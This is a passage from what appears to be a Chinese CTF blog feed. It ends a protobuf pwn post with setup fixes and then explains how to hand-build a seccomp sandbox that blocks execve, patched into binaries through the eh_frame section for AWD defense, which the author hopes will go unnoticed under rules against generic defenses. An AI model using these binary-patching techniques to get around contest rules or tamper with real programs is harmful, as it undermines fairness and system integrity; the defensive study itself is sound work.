+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /mnt/e/ctf/2024shctf/pwn/shctf——challage_pwn_protobuf/libprotobuf-c.so.1 /usr/lib/libprotobuf-c.so.1</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="2-运行exp时因为引入了proto转成的python文件报错"><a href="#2-运行exp时因为引入了proto转成的python文件报错" class="headerlink" title="2.运行exp时因为引入了proto转成的python文件报错"></a>2.运行exp时因为引入了proto转成的python文件报错</h5><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026154314346.png"
+                      class=""
+                >
+
+<p>提高python库中protobuf的版本</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 uninstall protobuf</span><br><span class="line">pip3 install protobuf==3.19.0</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h5 id="3-逆出结构体后prpto一直无法正常解析"><a href="#3-逆出结构体后prpto一直无法正常解析" class="headerlink" title="3.逆出结构体后prpto一直无法正常解析"></a>3.逆出结构体后prpto一直无法正常解析</h5><p>可以尝试把<code>sendline</code>换成<code>send</code>，有时候多一个换行符就解析不出来了。</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>protobuf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>self-made sandbox</title>
+    <url>/blog/2024/09/21/self-made-sandbox/</url>
+    <content><![CDATA[<p>由于最近要打几场awd，一个一个漏洞改过来感觉有点麻烦，所以想到了上沙箱，但是一般好像比赛会禁止上通防，这里想试试看自己通过系统调用写一个沙箱出来，看看能不能瞒天过海。</p>
+<h3 id="一、c代码实现沙箱"><a href="#一、c代码实现沙箱" class="headerlink" title="一、c代码实现沙箱"></a>一、c代码实现沙箱</h3><p>不是很清楚沙箱具体用到的系统调用，所以先让gpt生成了一段正常用c语言实现的沙箱代码。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="comment">//gcc -g test.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">install_seccomp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        <span class="comment">// 读取系统调用号</span></span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查是否为 execve 系统调用（编号 59）</span></span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>), </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果是 execve，则杀死进程</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 允许其他系统调用</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">        .filter = filter</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启用 seccomp 过滤模式</span></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    install_seccomp();</span><br><span class="line">    <span class="comment">// 你可以在这里运行原来的程序逻辑</span></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个 <code>install_seccomp()</code> 函数的作用是通过 <code>seccomp</code>（安全计算模式）设置一个简单的沙箱来限制程序能够调用的系统调用，具体来说，是禁止调用 <code>execve</code> 系统调用。如果程序尝试调用 <code>execve</code>，则会被杀死。其余的系统调用则被允许执行。</p>
+<p>以下是其中每个部分的功能和用法的详细解释：</p>
+<h4 id="struct-sock-filter-filter"><a href="#struct-sock-filter-filter" class="headerlink" title="struct sock_filter filter[]"></a>struct sock_filter filter[]</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>), </span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>这是一个 BPF（Berkeley Packet Filter）过滤器指令数组，用来定义程序的过滤规则。每一条 <code>sock_filter</code> 定义了一条 BPF 指令，用来判断并处理系统调用。</p>
+<p><strong>第一条指令</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr))</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>这里使用 <code>BPF_LD</code> 加载 <code>seccomp_data</code> 结构体中的 <code>nr</code> 成员（即系统调用号）。</li>
+<li><code>BPF_W</code> 表示加载的是一个 32 位的值。</li>
+<li><code>BPF_ABS</code> 表示从固定的偏移量读取数据。</li>
+<li><code>offsetof(struct seccomp_data, nr)</code> 是 <code>seccomp_data</code> 结构体中 <code>nr</code> 成员的偏移量，<code>nr</code> 是存储系统调用号的字段。</li>
+</ul>
+<p>这条指令的作用是读取当前正在执行的系统调用号，以便后续判断是否是 <code>execve</code> 系统调用。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> nr;        <span class="comment">// 系统调用号</span></span><br><span class="line">    __u32 arch;    <span class="comment">// 架构信息</span></span><br><span class="line">    __u64 instruction_pointer; <span class="comment">// 指令指针</span></span><br><span class="line">    __u64 args[<span class="number">6</span>]; <span class="comment">// 系统调用参数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>其中由于linux内核中结构体定义如上，所以实际上offsetof(struct seccomp_data, nr)也可以写为0。</p>
+<p><strong>第二条指令</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>BPF_JMP</code> 指令执行跳转。</li>
+<li><code>BPF_JEQ</code> 是“跳转如果相等”的操作符，表示如果条件为真则跳转。</li>
+<li><code>BPF_K</code> 指定了一个立即数（这里为 59）。</li>
+</ul>
+<p>这条指令会判断加载的系统调用号是否等于 <code>execve</code> 的系统调用号（59）。如果是，则跳过后面的第一条指令，继续执行杀死进程的语句；否则跳过后面的两条指令，直接允许执行系统调用。</p>
+<p><strong>第三条指令</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>BPF_RET</code> 表示返回结果。</li>
+<li><code>BPF_K</code> 表示一个立即数操作，这里为 <code>SECCOMP_RET_KILL</code>，这是 seccomp 的一个特定返回值，表示当遇到 <code>execve</code> 系统调用时杀死进程。</li>
+</ul>
+<p>这条指令表示如果系统调用号是 <code>execve</code>，则终止进程。</p>
+<p><strong>第四条指令</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>这条指令会返回 <code>SECCOMP_RET_ALLOW</code>，表示允许其他系统调用正常执行。</li>
+</ul>
+<h4 id="struct-sock-fprog-prog"><a href="#struct-sock-fprog-prog" class="headerlink" title="struct sock_fprog prog"></a><strong>struct sock_fprog prog</strong></h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">    .filter = filter</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>struct sock_fprog</code> 是一个包含 seccomp 过滤器程序的结构体：<ul>
+<li><code>len</code> 表示 <code>filter</code> 数组的长度（指令数量）。通过 <code>sizeof(filter) / sizeof(filter[0])</code> 来计算过滤器中有多少条指令。</li>
+<li><code>filter</code> 是一个指向 <code>sock_filter</code> 数组的指针，用于存储 seccomp 过滤器的指令集。</li>
+</ul>
+</li>
+</ul>
+<p>该结构体用于将 BPF 过滤器指令加载到内核中。</p>
+<h4 id="prctl-系统调用"><a href="#prctl-系统调用" class="headerlink" title="prctl 系统调用"></a><strong>prctl 系统调用</strong></h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) != <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>prctl</code> 是用来对进程的某些属性进行设置的系统调用。</li>
+<li><code>PR_SET_SECCOMP</code> 是用于启用 seccomp 的选项。</li>
+<li><code>SECCOMP_MODE_FILTER</code> 表示以过滤模式运行 seccomp，意味着我们会使用 BPF 过滤器来决定哪些系统调用可以执行，哪些会被拒绝。</li>
+<li><code>&amp;prog</code> 是指向我们定义的过滤器程序的指针，它告诉内核使用这个过滤器来限制系统调用。</li>
+</ul>
+<p>如果 <code>prctl</code> 调用失败，意味着 seccomp 设置失败，会输出错误信息并终止进程。</p>
+<p>这里其实也可以把SECCOMP_MODE_FILTER改成 SECCOMP_MODE_STRICT  ，然后就不用构建并传prog了，这样一来会仅仅允许exit，sigreturn，read以及write的系统调用。</p>
+<p>其中BPF_STMT与BPF_JUMP实际上是一个宏定义，是条件编译后赋值的sock_filter结构体，这就是为什么<code>struct sock_filter filter[]</code>这个声明是声明结构体数组。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_STMT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_STMT(code,k)&#123;(unsigned short)(code),0,0,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_JUMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_JUMP(code,k,jt,jf)&#123;(unsigned short)(code),jt,jf,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>而sock_filter的结构体定义如下：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span></span><br><span class="line">    __u16   code;   <span class="comment">/* BPF opcode */</span></span><br><span class="line">    __u8    jt;     <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8    jf;     <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32   k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="其他一些常用的宏定义"><a href="#其他一些常用的宏定义" class="headerlink" title="其他一些常用的宏定义"></a>其他一些常用的宏定义</h4><p>基本都是位掩码，只需要知道其代表的含义即可。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 主指令类别（2 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LD          0x00  <span class="comment">// Load</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LDX         0x01  <span class="comment">// Load with index</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ST          0x02  <span class="comment">// Store</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_STX         0x03  <span class="comment">// Store with index</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU         0x04  <span class="comment">// ALU (arithmetic logic unit) operation</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP         0x05  <span class="comment">// Jump</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RET         0x06  <span class="comment">// Return</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MISC        0x07  <span class="comment">// Miscellaneous</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 操作码的大小（3 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_W           0x00  <span class="comment">// Word (32-bit)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_H           0x08  <span class="comment">// Half-word (16-bit)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_B           0x10  <span class="comment">// Byte (8-bit)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载/存储操作的模式（3 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_IMM         0x00  <span class="comment">// Immediate value</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ABS         0x20  <span class="comment">// Absolute</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_IND         0x40  <span class="comment">// Indirect</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MEM         0x60  <span class="comment">// Memory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LEN         0x80  <span class="comment">// Packet length</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MSH         0xA0  <span class="comment">// Modulo shift</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算和比较操作的源（1 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_K           0x00  <span class="comment">// Constant</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_X           0x08  <span class="comment">// Register</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ALU 运算符（4 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ADD         0x00  <span class="comment">// Addition</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SUB         0x10  <span class="comment">// Subtraction</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MUL         0x20  <span class="comment">// Multiplication</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_DIV         0x30  <span class="comment">// Division</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_OR          0x40  <span class="comment">// Bitwise OR</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_AND         0x50  <span class="comment">// Bitwise AND</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LSH         0x60  <span class="comment">// Left shift</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RSH         0x70  <span class="comment">// Right shift</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_NEG         0x80  <span class="comment">// Negation</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MOD         0x90  <span class="comment">// Modulo</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_XOR         0xA0  <span class="comment">// Bitwise XOR</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转条件（4 位）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JA          0x00  <span class="comment">// Jump unconditionally</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JEQ         0x10  <span class="comment">// Jump if equal</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JGT         0x20  <span class="comment">// Jump if greater than</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JGE         0x30  <span class="comment">// Jump if greater or equal</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JSET        0x40  <span class="comment">// Jump if bits are set</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Return 操作码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RET         0x06  <span class="comment">// Return</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_KILL 0x00000000  <span class="comment">// Kill process</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ALLOW 0x7fff0000 <span class="comment">// Allow syscall</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对seccomp mode 进行操作</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP      21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECCOMP     22</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="二、调试获取汇编写法"><a href="#二、调试获取汇编写法" class="headerlink" title="二、调试获取汇编写法"></a>二、调试获取汇编写法</h3><p>查看pwndbg，install_seccomp()函数的主逻辑如下，我们可以发现除了prctl系统调用外，前面的一系列结构体的初始化都没有调用函数，而且这一大通操作实际上很多是一个一个字节进行的修改，那么我们在eh_frame空间有限的情况下，实际可以通过8字节直接赋值参数来节省掉许多指令字节。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x5555555551e4 &lt;install_seccomp+27&gt;    mov    word ptr [rbp - 0x30], 0x20     [0x7fffffffe450] =&gt; 0x20</span><br><span class="line">0x5555555551ea &lt;install_seccomp+33&gt;    mov    byte ptr [rbp - 0x2e], 0        [0x7fffffffe452] =&gt; 0</span><br><span class="line">0x5555555551ee &lt;install_seccomp+37&gt;    mov    byte ptr [rbp - 0x2d], 0        [0x7fffffffe453] =&gt; 0</span><br><span class="line">0x5555555551f2 &lt;install_seccomp+41&gt;    mov    dword ptr [rbp - 0x2c], 0       [0x7fffffffe454] =&gt; 0</span><br><span class="line">0x5555555551f9 &lt;install_seccomp+48&gt;    mov    word ptr [rbp - 0x28], 0x15     [0x7fffffffe458] =&gt; 0x15</span><br><span class="line">0x5555555551ff &lt;install_seccomp+54&gt;    mov    byte ptr [rbp - 0x26], 0        [0x7fffffffe45a] =&gt; 0</span><br><span class="line">0x555555555203 &lt;install_seccomp+58&gt;     mov    byte ptr [rbp - 0x25], 1               [0x7fffffffe45b] =&gt; 1</span><br><span class="line">0x555555555207 &lt;install_seccomp+62&gt;     mov    dword ptr [rbp - 0x24], 0x3b           [0x7fffffffe45c] =&gt; 0x3b</span><br><span class="line">0x55555555520e &lt;install_seccomp+69&gt;     mov    word ptr [rbp - 0x20], 6               [0x7fffffffe460] =&gt; 6</span><br><span class="line">0x555555555214 &lt;install_seccomp+75&gt;     mov    byte ptr [rbp - 0x1e], 0               [0x7fffffffe462] =&gt; 0</span><br><span class="line">0x555555555218 &lt;install_seccomp+79&gt;     mov    byte ptr [rbp - 0x1d], 0               [0x7fffffffe463] =&gt; 0</span><br><span class="line">0x55555555521c &lt;install_seccomp+83&gt;     mov    dword ptr [rbp - 0x1c], 0              [0x7fffffffe464] =&gt; 0</span><br><span class="line">0x555555555223 &lt;install_seccomp+90&gt;     mov    word ptr [rbp - 0x18], 6               [0x7fffffffe468] =&gt; 6</span><br><span class="line">0x555555555229 &lt;install_seccomp+96&gt;     mov    byte ptr [rbp - 0x16], 0               [0x7fffffffe46a] =&gt; 0</span><br><span class="line">0x55555555522d &lt;install_seccomp+100&gt;    mov    byte ptr [rbp - 0x15], 0               [0x7fffffffe46b] =&gt; 0</span><br><span class="line">0x555555555231 &lt;install_seccomp+104&gt;    mov    dword ptr [rbp - 0x14], 0x7fff0000     [0x7fffffffe46c] =&gt; 0x7fff0000</span><br><span class="line">0x555555555238 &lt;install_seccomp+111&gt;    mov    word ptr [rbp - 0x40], 4               [0x7fffffffe440] =&gt; 4</span><br><span class="line">0x55555555523e &lt;install_seccomp+117&gt;    lea    rax, [rbp - 0x30]                      RAX =&gt; 0x7fffffffe450 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">0x555555555242 &lt;install_seccomp+121&gt;    mov    qword ptr [rbp - 0x38], rax            [0x7fffffffe448] =&gt; 0x7fffffffe450 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">0x555555555246 &lt;install_seccomp+125&gt;    lea    rax, [rbp - 0x40]                      RAX =&gt; 0x7fffffffe440 ◂— 4</span><br><span class="line">0x55555555524a &lt;install_seccomp+129&gt;    mov    rdx, rax                               RDX =&gt; 0x7fffffffe440 ◂— 4</span><br><span class="line">0x55555555524d &lt;install_seccomp+132&gt;    mov    esi, 2                                 ESI =&gt; 2</span><br><span class="line">0x555555555252 &lt;install_seccomp+137&gt;    mov    edi, 0x16                              EDI =&gt; 0x16</span><br><span class="line">0x555555555257 &lt;install_seccomp+142&gt;    mov    eax, 0                                 EAX =&gt; 0</span><br><span class="line">0x55555555525c &lt;install_seccomp+147&gt;    call   prctl@plt                   			  &lt;prctl@plt&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151136186.png"
+                      class=""
+                >
+
+<p>最后整个prog结构体的地址是存在rdx中，也就是rbp - 0x40这个地址处。但之后遇到了问题，在prctl函数的实现中，在prctl的系统调用时始终不成功，返回的rax代表的错误码。之后尝试直接执行test，发现是权限问题。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151151584.png"
+                      class=""
+                >
+
+<p>这下尴尬了，本来想上沙箱是为了方便防御，这么一来二去搞awd前还得提权，更加麻烦了，这下就只能算是学习沙箱实现的机制了。那么我们得切到root用户进行调试（本来想setuid改文件，但好像wsl不支持），进到prctl具体实现里看看。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ffff7eae338</span> &lt;prctl+<span class="number">8</span>&gt;        mov    r10, rcx                        R10 =&gt; <span class="number">0x555555557da0</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="number">0x555555555180</span> (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line"><span class="number">0x7ffff7eae33b</span> &lt;prctl+<span class="number">11</span>&gt;       mov    qword ptr [rsp + <span class="number">0x28</span>], rsi     [<span class="number">0x7fffffffe408</span>] =&gt; <span class="number">2</span></span><br><span class="line"><span class="number">0x7ffff7eae340</span> &lt;prctl+<span class="number">16</span>&gt;       mov    qword ptr [rsp + <span class="number">0x30</span>], rdx     [<span class="number">0x7fffffffe410</span>] =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae345</span> &lt;prctl+<span class="number">21</span>&gt;       mov    qword ptr [rsp + <span class="number">0x38</span>], rcx     [<span class="number">0x7fffffffe418</span>] =&gt; <span class="number">0x555555557da0</span> (__do_global_dtors_aux_fini_array_entry) —▸ <span class="number">0x555555555180</span> (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line"><span class="number">0x7ffff7eae34a</span> &lt;prctl+<span class="number">26</span>&gt;       mov    qword ptr [rsp + <span class="number">0x40</span>], r8      [<span class="number">0x7fffffffe420</span>] =&gt; <span class="number">0x7ffff7fa3f10</span> (initial+<span class="number">16</span>) ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae34f</span> &lt;prctl+<span class="number">31</span>&gt;       mov    rax, qword ptr fs:[<span class="number">0x28</span>]        RAX, [<span class="number">0x7ffff7d85768</span>] =&gt; <span class="number">0xc68810ecdaf50d00</span></span><br><span class="line"><span class="number">0x7ffff7eae358</span> &lt;prctl+<span class="number">40</span>&gt;       mov    qword ptr [rsp + <span class="number">0x18</span>], rax     [<span class="number">0x7fffffffe3f8</span>] =&gt; <span class="number">0xc68810ecdaf50d00</span></span><br><span class="line"><span class="number">0x7ffff7eae35d</span> &lt;prctl+<span class="number">45</span>&gt;    xor    eax, eax                        EAX =&gt; <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae35f</span> &lt;prctl+<span class="number">47</span>&gt;    lea    rax, [rsp + <span class="number">0x60</span>]               RAX =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae364</span> &lt;prctl+<span class="number">52</span>&gt;    mov    dword ptr [rsp], <span class="number">8</span>              [<span class="number">0x7fffffffe3e0</span>] =&gt; <span class="number">8</span></span><br><span class="line"><span class="number">0x7ffff7eae36b</span> &lt;prctl+<span class="number">59</span>&gt;    mov    qword ptr [rsp + <span class="number">8</span>], rax        [<span class="number">0x7fffffffe3e8</span>] =&gt; <span class="number">0x7fffffffe440</span> ◂— <span class="number">4</span></span><br><span class="line"><span class="number">0x7ffff7eae370</span> &lt;prctl+<span class="number">64</span>&gt;    lea    rax, [rsp + <span class="number">0x20</span>]               RAX =&gt; <span class="number">0x7fffffffe400</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae375</span> &lt;prctl+<span class="number">69</span>&gt;    mov    qword ptr [rsp + <span class="number">0x10</span>], rax     [<span class="number">0x7fffffffe3f0</span>] =&gt; <span class="number">0x7fffffffe400</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">0x7ffff7eae37a</span> &lt;prctl+<span class="number">74</span>&gt;    mov    eax, <span class="number">0x9d</span>                       EAX =&gt; <span class="number">0x9d</span></span><br><span class="line"><span class="number">0x7ffff7eae37f</span> &lt;prctl+<span class="number">79</span>&gt;    syscall  &lt;SYS_prctl&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>最后syscall时rdi为0x16，rsi为2，rdx为0x7fffffffe440（prog结构体地址），前面的操作用处不大，就是把寄存器参数加载到了栈上以及存了下canary。r10用rcx赋值，r8不变。那么我们只要把那个结构体伪造出来，就可以直接syscall来禁用一些系统调用。理论可行，开始手搓。</p>
+<p>我们可以拿一道简单的栈溢出来试一下，更改程序我用的是 <a class="link"   href="https://github.com/aftern00n/AwdPwnPatcher" >https://github.com/aftern00n/AwdPwnPatcher<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 这个库，我们可以把call init patch成一个跳转到ehframe段执行，再在ehframe段最后手动加上call init。AwdPwnPatcher中有个add_constant_in_ehframe方法，其中会将传入的字符串转换为字节字符串。我感觉还是直接在传参前用p64伪造好结构体的各字段比较方便，所以就把库里面字符串的encode逻辑给注释掉了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151211381.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/21/self-made-sandbox/image-20240921151222496.png"
+                      class=""
+                >
+
